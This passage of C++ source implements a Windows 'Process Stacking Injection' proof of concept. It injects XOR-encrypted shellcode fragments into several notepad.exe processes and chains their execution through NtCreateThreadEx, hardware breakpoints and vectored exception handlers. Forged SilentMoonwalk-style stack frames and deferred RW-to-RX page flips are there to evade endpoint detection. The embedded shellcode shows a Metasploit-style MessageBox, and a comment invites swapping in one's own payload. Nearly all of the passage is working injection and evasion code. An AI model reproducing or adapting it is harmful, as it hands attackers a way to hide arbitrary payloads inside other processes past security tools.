        std::cout << "[+] Shared section created, local view at 0x"
                  << std::hex << localView << std::dec << "\n";
        return true;
    }

    // Map the shared section into a remote process (RW for IPC)
    LPVOID MapIntoProcess(HANDLE hProcess) {
        LPVOID remoteView = nullptr;
        SIZE_T remoteViewSize = SHARED_SIZE;

        NTSTATUS status = NtMapViewOfSection(
            hSection, hProcess, &remoteView,
            0, 0, NULL, &remoteViewSize, 2 /*ViewShare*/, 0, PAGE_READWRITE);

        if (status != 0) {
            std::cerr << "[-] NtMapViewOfSection (remote) failed: 0x"
                      << std::hex << status << "\n";
            return nullptr;
        }
        return remoteView;
    }

    SharedContext* GetLocal() {
        return reinterpret_cast<SharedContext*>(localView);
    }

    void SetSignal(DWORD value) {
        InterlockedExchange(&GetLocal()->signal, value);
    }

    DWORD WaitForSignal(DWORD expected, DWORD timeoutMs = 30000) {
        DWORD elapsed = 0;
        while (elapsed < timeoutMs) {
            LONG sig = InterlockedCompareExchange(&GetLocal()->signal, expected, expected);
            if (sig == (LONG)expected)
                return sig;
            Sleep(1);
            elapsed++;
        }
        return (DWORD)GetLocal()->signal;
    }

    void Cleanup() {
        if (localView) {
            NtUnmapViewOfSection(GetCurrentProcess(), localView);
            localView = nullptr;
        }
        if (hSection) {
            CloseHandle(hSection);
            hSection = NULL;
        }
    }
};

// ============================================================================
// Section 8: Hardware Breakpoint Configuration
// ============================================================================

// Set DR0 execution breakpoint at targetAddr on the specified thread
bool SetHardwareBreakpoint(HANDLE hThread, uint64_t targetAddr) {
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if (!GetThreadContext(hThread, &ctx)) {
        std::cerr << "[-] GetThreadContext (debug regs) failed: " << GetLastError() << "\n";
        return false;
    }

    ctx.Dr0 = (DWORD64)targetAddr;
    ctx.Dr1 = 0;
    ctx.Dr2 = 0;
    ctx.Dr3 = 0;
    ctx.Dr6 = 0;

    // DR7: Enable DR0 local breakpoint, execution type, 1-byte length
    // Bit 0: L0 = 1 (local enable DR0)
    // Bits 16-17: R/W0 = 00 (break on execution)
    // Bits 18-19: LEN0 = 00 (1 byte, required for execution BPs)
    ctx.Dr7 = (1ULL << 0);  // L0 = 1, all R/W and LEN fields = 0

    if (!SetThreadContext(hThread, &ctx)) {
        std::cerr << "[-] SetThreadContext (debug regs) failed: " << GetLastError() << "\n";
        return false;
    }
    return true;
}

bool ClearHardwareBreakpoints(HANDLE hThread) {
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (!GetThreadContext(hThread, &ctx)) return false;

    ctx.Dr0 = ctx.Dr1 = ctx.Dr2 = ctx.Dr3 = 0;
    ctx.Dr6 = ctx.Dr7 = 0;

    return SetThreadContext(hThread, &ctx) != 0;
}

// ============================================================================
// Section 9: Stack Spoofing (SilentMoonwalk-style fake frame chain)
// ============================================================================

// Build fake call stack frames that mimic legitimate thread startup:
//   ntdll!RtlUserThreadStart -> kernel32!BaseThreadInitThunk -> [our code]
bool ApplyStackSpoof(HANDLE hProcess, HANDLE hThread,
                     LPVOID entryPoint, LPVOID stackBase)
{
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    HMODULE hNtdll    = GetModuleHandleA("ntdll.dll");

    // Resolve legitimate system function addresses for fake frames
    // These will be the same in the target process (system DLLs share base address)
    uint64_t btitAddr = (uint64_t)GetProcAddress(hKernel32, "BaseThreadInitThunk");
    uint64_t rutsAddr = (uint64_t)GetProcAddress(hNtdll, "RtlUserThreadStart");

    if (!btitAddr || !rutsAddr) {
        std::cerr << "[-] Failed to resolve stack spoof targets\n";
        return false;
    }

    // Typical offsets into these functions that appear as return addresses
    // These simulate a legitimate call chain
    uint64_t fakeRet1 = btitAddr + 0x14;  // kernel32!BaseThreadInitThunk+0x14
    uint64_t fakeRet2 = rutsAddr + 0x21;  // ntdll!RtlUserThreadStart+0x21

    // Build the spoofed stack (grows downward)
    // Layout (from high to low address):
    //   [fakeRet2]    <- bottom frame (RtlUserThreadStart)
    //   [fakeRet1]    <- next frame (BaseThreadInitThunk)
    //   [0x00000000]  <- fake RBP (end of chain)
    //   [shadow space] <- 32 bytes
    //   RSP points here

    uintptr_t sp = (uintptr_t)stackBase + 0x10000 - 0x100;  // near top, aligned
    sp &= ~0xF;  // 16-byte align

    uint64_t zero = 0;

    // Write fake frame 2 (bottom): RtlUserThreadStart return
    sp -= 8;
    WriteProcessMemory(hProcess, (LPVOID)sp, &fakeRet2, 8, NULL);

    // Write fake frame 1: BaseThreadInitThunk return
    sp -= 8;
    WriteProcessMemory(hProcess, (LPVOID)sp, &fakeRet1, 8, NULL);

    // Write fake RBP = 0 (end of frame chain)
    sp -= 8;
    WriteProcessMemory(hProcess, (LPVOID)sp, &zero, 8, NULL);
    uint64_t fakeRbp = sp;

    // Shadow space (32 bytes)
    sp -= 0x20;

    // Apply to thread context
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_CONTROL | CONTEXT_INTEGER;
    if (!GetThreadContext(hThread, &ctx)) return false;

    ctx.Rsp = sp;
    ctx.Rbp = fakeRbp;
    ctx.Rip = (DWORD64)entryPoint;

    return SetThreadContext(hThread, &ctx) != 0;
}

// ============================================================================
// Section 10: XOR Encryption
// ============================================================================

void XorEncrypt(uint8_t* data, size_t size, uint8_t key) {
    for (size_t i = 0; i < size; i++)
        data[i] ^= key;
}

// ============================================================================
// Section 11: Fragment Injection Engine
// ============================================================================

class ProcessStackingInjector {
    pfnNtCreateThreadEx NtCreateThreadEx = nullptr;
    SharedSectionIPC    ipc;
    std::vector<FragmentInfo> fragments;
    uint8_t* shellcode;
    size_t   shellcodeSize;
    int      numFragments;

public:
    bool Initialize(uint8_t* sc, size_t scSize, int nFrags) {
        shellcode = sc;
        shellcodeSize = scSize;
        numFragments = nFrags;

        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        NtCreateThreadEx = (pfnNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
        if (!NtCreateThreadEx) {
            std::cerr << "[-] Failed to resolve NtCreateThreadEx\n";
            return false;
        }

        if (!ipc.Initialize()) return false;
        return true;
    }

    // Phase 1: Fragment shellcode at instruction boundaries
    bool FragmentShellcode(const std::vector<DWORD>& pids) {
        auto bounds = FragmentAtInstructionBoundaries(shellcode, shellcodeSize, numFragments);
        if (bounds.empty()) return false;

        std::cout << "[*] Fragmented shellcode into " << bounds.size() << " chunks:\n";
        for (size_t i = 0; i < bounds.size(); i++) {
            std::cout << "    Fragment " << i << ": offset=0x" << std::hex << bounds[i].offset
                      << " size=0x" << bounds[i].size << std::dec << "\n";
        }

        fragments.resize(bounds.size());
        for (size_t i = 0; i < bounds.size(); i++) {
            fragments[i].offset  = bounds[i].offset;
            fragments[i].size    = bounds[i].size;
            fragments[i].hostPid = pids[i];
            fragments[i].hProcess = NULL;
            fragments[i].hThread  = NULL;
        }
        return true;
    }

    // Phase 2: Set up VEH handler in each host process
    bool SetupAllHosts() {
        uint64_t avehAddr = (uint64_t)GetProcAddress(
            GetModuleHandleA("kernel32.dll"), "AddVectoredExceptionHandler");

        if (!avehAddr) {
            std::cerr << "[-] Failed to resolve AddVectoredExceptionHandler\n";
            return false;
        }

        for (size_t i = 0; i < fragments.size(); i++) {
            FragmentInfo& fi = fragments[i];

            fi.hProcess = OpenProcess(
                PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ |
                PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION,
                FALSE, fi.hostPid);

            if (!fi.hProcess) {
                std::cerr << "[-] OpenProcess failed for PID " << fi.hostPid
                          << ": " << GetLastError() << "\n";
                return false;
            }

            // Map shared section into target
            fi.sharedMapAddr = ipc.MapIntoProcess(fi.hProcess);
            if (!fi.sharedMapAddr) return false;

            // Build VEH handler shellcode with target's shared section address
            auto handlerCode = Stubs::GenerateVEHHandler((uint64_t)fi.sharedMapAddr);

            // Allocate and write VEH handler (RX)
            fi.vehHandlerAddr = VirtualAllocEx(fi.hProcess, NULL, handlerCode.size(),
                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!fi.vehHandlerAddr) return false;

            WriteProcessMemory(fi.hProcess, fi.vehHandlerAddr,
                handlerCode.data(), handlerCode.size(), NULL);

            // Flip handler to RX
            DWORD oldProt;
            VirtualProtectEx(fi.hProcess, fi.vehHandlerAddr, handlerCode.size(),
                PAGE_EXECUTE_READ, &oldProt);

            // Build and inject VEH setup stub
            auto setupCode = Stubs::GenerateVEHSetup(
                (uint64_t)fi.vehHandlerAddr, avehAddr);

            LPVOID setupAddr = VirtualAllocEx(fi.hProcess, NULL, setupCode.size(),
                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!setupAddr) return false;

            WriteProcessMemory(fi.hProcess, setupAddr, setupCode.data(), setupCode.size(), NULL);

            // Flip setup to RX
            VirtualProtectEx(fi.hProcess, setupAddr, setupCode.size(),
                PAGE_EXECUTE_READ, &oldProt);

            // Execute VEH setup via NtCreateThreadEx
            HANDLE hSetupThread = NULL;
            NTSTATUS status = NtCreateThreadEx(
                &hSetupThread, GENERIC_ALL, NULL, fi.hProcess,
                setupAddr, NULL, 0, 0, 0, 0, NULL);

            if (status != 0) {
                std::cerr << "[-] NtCreateThreadEx (VEH setup) failed in PID "
                          << fi.hostPid << ": 0x" << std::hex << status << "\n";
                return false;
            }

            // Wait for VEH registration to complete
            WaitForSingleObject(hSetupThread, 5000);
            CloseHandle(hSetupThread);

            // Free setup stub (no longer needed)
            VirtualFreeEx(fi.hProcess, setupAddr, 0, MEM_RELEASE);

            std::cout << "[+] VEH registered in PID " << fi.hostPid
                      << " | handler @ 0x" << std::hex << fi.vehHandlerAddr
                      << " | shared @ 0x" << fi.sharedMapAddr << std::dec << "\n";
        }
        return true;
    }

    // Phase 3: Inject encrypted fragments with stubs into each host
    bool InjectFragments() {
        for (size_t i = 0; i < fragments.size(); i++) {
            FragmentInfo& fi = fragments[i];

            // Generate stubs
            auto decryptStub    = Stubs::GenerateDecryptStub((uint32_t)fi.size, XOR_KEY);
            auto transitionStub = Stubs::GenerateTransitionStub();

            // Encrypt the fragment
            std::vector<uint8_t> encFragment(shellcode + fi.offset, shellcode + fi.offset + fi.size);
            XorEncrypt(encFragment.data(), encFragment.size(), XOR_KEY);

            // Build payload: [decrypt_stub | encrypted_fragment | transition_stub]
            size_t totalPayloadSize = decryptStub.size() + encFragment.size() + transitionStub.size();

            std::vector<uint8_t> payload;
            payload.reserve(totalPayloadSize);
            payload.insert(payload.end(), decryptStub.begin(), decryptStub.end());
            payload.insert(payload.end(), encFragment.begin(), encFragment.end());
            payload.insert(payload.end(), transitionStub.begin(), transitionStub.end());

            // Allocate as RW (deferred RX flip)
            fi.payloadBase = VirtualAllocEx(fi.hProcess, NULL, totalPayloadSize,
                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!fi.payloadBase) {
                std::cerr << "[-] VirtualAllocEx (payload) failed in PID "
                          << fi.hostPid << "\n";
                return false;
            }

            // Write payload (still RW - no execution yet)
            WriteProcessMemory(fi.hProcess, fi.payloadBase, payload.data(), payload.size(), NULL);

            // Calculate key addresses within the payload
            fi.fragmentAddr   = (LPVOID)((uintptr_t)fi.payloadBase + decryptStub.size());
            fi.transitionAddr = (LPVOID)((uintptr_t)fi.payloadBase + decryptStub.size() + fi.size);

            // Allocate stack for this fragment's thread
            fi.stackBase = VirtualAllocEx(fi.hProcess, NULL, 0x10000,
                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

            std::cout << "[+] Fragment " << i << " injected in PID " << fi.hostPid
                      << " | payload @ 0x" << std::hex << fi.payloadBase
                      << " | transition @ 0x" << fi.transitionAddr
                      << " | (RW, pending RX flip)" << std::dec << "\n";
        }
        return true;
    }

    // Phase 4: Chain execution across all hosts
    bool ExecuteChain() {
        std::cout << "\n[*] === Beginning chain execution ===\n\n";

        for (size_t i = 0; i < fragments.size(); i++) {
            FragmentInfo& fi = fragments[i];

            std::cout << "[*] Fragment " << i << " / PID " << fi.hostPid << ":\n";

            // Step 1: Deferred RW -> RX protection flip
            DWORD oldProt;
            size_t payloadSize = Stubs::DECRYPT_STUB_SIZE + fi.size + Stubs::TRANSITION_STUB_SIZE;
            VirtualProtectEx(fi.hProcess, fi.payloadBase, payloadSize,
                PAGE_EXECUTE_READ, &oldProt);
            std::cout << "    [+] Page flipped RW -> RX\n";

            // Step 2: Create thread in suspended state
            HANDLE hThread = NULL;
            NTSTATUS status = NtCreateThreadEx(
                &hThread, GENERIC_ALL, NULL, fi.hProcess,
                fi.payloadBase,  // starts at decrypt stub
                NULL,
                0x00000001,  // CREATE_SUSPENDED
                0, 0x10000, 0x10000, NULL);

            if (status != 0 || !hThread) {
                std::cerr << "    [-] NtCreateThreadEx failed: 0x" << std::hex << status << "\n";
                return false;
            }
            fi.hThread = hThread;

            // Step 3: Set hardware breakpoint on transition stub
            SetHardwareBreakpoint(hThread, (uint64_t)fi.transitionAddr);
            std::cout << "    [+] Hardware breakpoint set: DR0 -> 0x"
                      << std::hex << fi.transitionAddr << std::dec << "\n";

            // Step 4: Apply stack spoofing
            ApplyStackSpoof(fi.hProcess, hThread, fi.payloadBase, fi.stackBase);
            std::cout << "    [+] Stack spoofed (SilentMoonwalk-style fake frames)\n";

            // Step 5: If not the first fragment, restore register state from previous
            if (i > 0) {
                RestoreRegistersFromShared(hThread);
                std::cout << "    [+] Registers restored from previous fragment CONTEXT\n";
            }

            // Step 6: Reset signal and resume thread
            ipc.SetSignal(SIGNAL_EXECUTING);
            ResumeThread(hThread);
            std::cout << "    [+] Thread resumed - fragment executing...\n";

            // Step 7: Wait for VEH handler to signal completion
            DWORD sig = ipc.WaitForSignal(SIGNAL_DONE, 30000);
            if (sig != SIGNAL_DONE) {
                std::cerr << "    [-] Timeout waiting for fragment " << i
                          << " (signal=" << sig << ")\n";
                TerminateThread(hThread, 0);
                CloseHandle(hThread);
                return false;
            }
            std::cout << "    [+] Fragment " << i << " completed - VEH caught #DB\n";

            // Step 8: Suspend thread (it's in the spin loop after VEH returned)
            SuspendThread(hThread);

            // Step 9: CONTEXT is already serialized to shared section by VEH handler
            std::cout << "    [+] CONTEXT serialized to shared section\n";

            // Clean up thread
            ClearHardwareBreakpoints(hThread);
            TerminateThread(hThread, 0);
            CloseHandle(hThread);

            // Reset signal for next fragment
            ipc.SetSignal(SIGNAL_IDLE);

            std::cout << "    [+] Fragment " << i << " chain link complete\n\n";
        }

        std::cout << "[+] === All " << fragments.size()
                  << " fragments executed successfully ===\n";
        return true;
    }

    void Cleanup() {
        for (auto& fi : fragments) {
            if (fi.payloadBase)
                VirtualFreeEx(fi.hProcess, fi.payloadBase, 0, MEM_RELEASE);
            if (fi.stackBase)
                VirtualFreeEx(fi.hProcess, fi.stackBase, 0, MEM_RELEASE);
            if (fi.vehHandlerAddr)
                VirtualFreeEx(fi.hProcess, fi.vehHandlerAddr, 0, MEM_RELEASE);
            if (fi.hProcess)
                CloseHandle(fi.hProcess);
        }
        ipc.Cleanup();
    }

private:
    // Restore key registers (RAX-R15, flags) from the shared CONTEXT
    // to a new thread, preserving the new thread's RSP/RIP/stack setup
    void RestoreRegistersFromShared(HANDLE hThread) {
        SharedContext* shared = ipc.GetLocal();
        CONTEXT* savedCtx = reinterpret_cast<CONTEXT*>(shared->savedContext);

        CONTEXT newCtx;
        newCtx.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
        GetThreadContext(hThread, &newCtx);

        // Transfer data registers (but NOT RSP/RBP/RIP which are set by stack spoof)
        newCtx.Rax = savedCtx->Rax;
        newCtx.Rbx = savedCtx->Rbx;
        newCtx.Rcx = savedCtx->Rcx;
        newCtx.Rdx = savedCtx->Rdx;
        newCtx.Rsi = savedCtx->Rsi;
        newCtx.Rdi = savedCtx->Rdi;
        newCtx.R8  = savedCtx->R8;
        newCtx.R9  = savedCtx->R9;
        newCtx.R10 = savedCtx->R10;
        newCtx.R11 = savedCtx->R11;
        newCtx.R12 = savedCtx->R12;
        newCtx.R13 = savedCtx->R13;
        newCtx.R14 = savedCtx->R14;
        newCtx.R15 = savedCtx->R15;
        newCtx.EFlags = savedCtx->EFlags;

        SetThreadContext(hThread, &newCtx);
    }
};

// ============================================================================
// Section 12: Main - Orchestrator
// ============================================================================

// MessageBox PoC shellcode (x64 - calls user32!MessageBoxA)
// Replace with your own payload for testing
unsigned char g_shellcode[] =
    "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00\x00\x41"
    "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
    "\x48\x8b\x52\x18\x48\x8b\x52\x20\x4d\x31\xc9\x48\x8b\x72"
    "\x50\x48\x0f\xb7\x4a\x4a\x48\x31\xc0\xac\x3c\x61\x7c\x02"
    "\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b"
    "\x52\x20\x8b\x42\x3c\x41\x51\x48\x01\xd0\x66\x81\x78\x18"
    "\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00"
    "\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x44\x8b\x40\x20\x49"
    "\x01\xd0\x8b\x48\x18\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88"
    "\x4d\x31\xc9\x48\x01\xd6\x48\x31\xc0\x41\xc1\xc9\x0d\xac"
    "\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39"
    "\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"
    "\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48"
    "\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41"
    "\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
    "\x8b\x12\xe9\x4b\xff\xff\xff\x5d\xe8\x0b\x00\x00\x00\x75"
    "\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00\x59\x41\xba\x4c"
    "\x77\x26\x07\xff\xd5\x49\xc7\xc1\x00\x00\x00\x00\xe8\x11"
    "\x00\x00\x00\x48\x65\x6c\x6c\x6f\x2c\x20\x66\x72\x6f\x6d"
    "\x20\x4d\x53\x46\x21\x00\x5a\xe8\x0b\x00\x00\x00\x4d\x65"
    "\x73\x73\x61\x67\x65\x42\x6f\x78\x00\x41\x58\x48\x31\xc9"
    "\x41\xba\x45\x83\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0"
    "\xb5\xa2\x56\xff\xd5";

int main(int argc, char* argv[]) {
    std::cout << "======================================\n";
    std::cout << " Process Stacking Injection - Full PoC\n";
    std::cout << "======================================\n\n";

    int numParts = 3;
    const wchar_t* targetProcess = L"notepad.exe";

    if (argc > 1) numParts = atoi(argv[1]);
    if (numParts < 2) numParts = 2;
    if (numParts > MAX_FRAGMENTS) numParts = MAX_FRAGMENTS;

    size_t scSize = sizeof(g_shellcode) - 1;

    // Validate shellcode with LDE
    std::cout << "[*] Validating shellcode with LDE (x86-64 Length Disassembler)...\n";
    if (!LDE::ValidateDisassembly(g_shellcode, scSize)) {
        std::cerr << "[-] Shellcode disassembly validation failed\n";
        return 1;
    }
    std::cout << "[+] Shellcode validated: " << scSize << " bytes, clean instruction boundaries\n\n";

    // Find host processes
    std::cout << "[*] Searching for " << numParts << " instances of target process...\n";
    auto pids = FindProcesses(targetProcess, numParts);

    if ((int)pids.size() < numParts) {
        std::cerr << "[-] Need " << numParts << " target processes, found " << pids.size() << "\n";
        std::cerr << "    Open more instances of the target process and retry.\n";
        return 1;
    }

    std::cout << "[+] Found " << pids.size() << " host processes:";
    for (DWORD pid : pids) std::cout << " " << pid;
    std::cout << "\n\n";

    // Initialize injector
    ProcessStackingInjector injector;
    if (!injector.Initialize(g_shellcode, scSize, numParts)) {
        std::cerr << "[-] Injector initialization failed\n";
        return 1;
    }

    // Phase 1: Fragment shellcode at instruction boundaries
    std::cout << "[*] Phase 1: Fragmenting shellcode at instruction boundaries...\n";
    if (!injector.FragmentShellcode(pids)) {
        std::cerr << "[-] Fragmentation failed\n";
        injector.Cleanup();
        return 1;
    }
    std::cout << "\n";

    // Phase 2: Set up VEH handlers in all hosts
    std::cout << "[*] Phase 2: Registering VEH handlers in host processes...\n";
    if (!injector.SetupAllHosts()) {
        std::cerr << "[-] VEH setup failed\n";
        injector.Cleanup();
        return 1;
    }
    std::cout << "\n";

    // Phase 3: Inject encrypted fragments with stubs
    std::cout << "[*] Phase 3: Injecting encrypted fragments with stubs...\n";
    if (!injector.InjectFragments()) {
        std::cerr << "[-] Fragment injection failed\n";
        injector.Cleanup();
        return 1;
    }
    std::cout << "\n";

    // Phase 4: Chain execution
    std::cout << "[*] Phase 4: Executing fragment chain...\n";
    if (!injector.ExecuteChain()) {
        std::cerr << "[-] Chain execution failed\n";
        injector.Cleanup();
        return 1;
    }

    injector.Cleanup();
    std::cout << "\n[+] Process Stacking Injection complete.\n";
    return 0;
}
